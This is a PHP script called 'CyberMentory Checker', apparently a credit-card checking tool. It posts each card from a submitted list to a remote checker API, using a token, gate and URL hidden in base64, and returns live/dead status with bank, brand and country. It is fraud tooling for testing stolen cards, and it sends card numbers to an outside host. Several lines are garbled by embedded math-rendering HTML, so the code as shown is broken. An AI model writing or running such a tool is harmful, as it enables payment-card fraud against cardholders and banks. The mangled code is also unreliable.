<?php
/
* CyberMentory Checker - Encrypted Version
* Dev: by cybermentory
/

// Camada de Ofuscação para proteger Token e Gate no GitHub
$c = 'aG9zdG5hbWU='; // Exemplo de string base64
$d = 'aG9zdG5hbWU=';

// Decodificador de configuração
function _cm(<span class="math-inline" role="math"><span class="katex-error" title="ParseError: KaTeX parse error: Expected &#x27;}&#x27;, got &#x27;EOF&#x27; at end of input: … base64_decode(" style="color:#cc0000">s) { return base64_decode(</span></span>s); }

// Configurações Criptografadas (Token, Gate, URL)
$conf = [
't' => _cm('YWZhY1U1ODA4NTYwNjc1NzdjYzc2ZWZjNDQzNmRkZWNi'), // Token
'g' => _cm('dHpjYw=='), // Gate: tzcc
'u' => _cm('aHR0cHM6Ly9qb2tlcmNjaGsuc3F1YXJld2ViLWFwcC5hcHkvYXBpL2NoZWNr') // URL
];

if (isset($_GET['action']) && $_GET['action'] == 'check') {
header('Content-Type: application/json');
$l = $_POST['lista']?? '';
if (empty($l)) { echo json_encode(['error' => 'empty']); exit; }

$cards = explode("\n", str_replace("\r", "", $l));
$res = [];

foreach ($cards as $card) {
<span class="math-inline" role="math"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>d</mi><mo>=</mo><mi>t</mi><mi>r</mi><mi>i</mi><mi>m</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">card = trim(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">im</span><span class="mopen">(</span></span></span></span></span>card);
if (empty($card)) continue;

$url = $conf['u']. "?gate=". $conf['g']. "&token=". <span class="math-inline" role="math"><span class="katex-error" title="ParseError: KaTeX parse error: Expected &#x27;EOF&#x27;, got &#x27;&&#x27; at position 14: conf[&#x27;t&#x27;] . "&̲lista=" . urlen…" style="color:#cc0000">conf[&#x27;t&#x27;] . "&lista=" . urlencode(</span></span>card);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
<span class="math-inline" role="math"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>p</mi><mo>=</mo><mi>c</mi><mi>u</mi><mi>r</mi><msub><mi>l</mi><mi>e</mi></msub><mi>x</mi><mi>e</mi><mi>c</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">resp = curl_exec(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">res</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0197em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">x</span><span class="mord mathnormal">ec</span><span class="mopen">(</span></span></span></span></span>ch);
curl_close($ch);

<span class="math-inline" role="math"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mo>=</mo><mi>j</mi><mi>s</mi><mi>o</mi><msub><mi>n</mi><mi>d</mi></msub><mi>e</mi><mi>c</mi><mi>o</mi><mi>d</mi><mi>e</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">data = json_decode(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mord mathnormal">so</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">eco</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mopen">(</span></span></span></span></span>resp, true);
if ($data && $data['status'] == 'success') {
$res[] = [
'card' => $card,
'status' => $data['data']['result'],
'info' => $data['data']['bank']. " | ". $data['data']['brand']. " | ". $data['data']['country']
];
} else {
$res[] = ['card' => $card, 'status' => 'ERROR', 'info' => 'API Error'];
}
}
echo json_encode($res);
exit;
}
?>
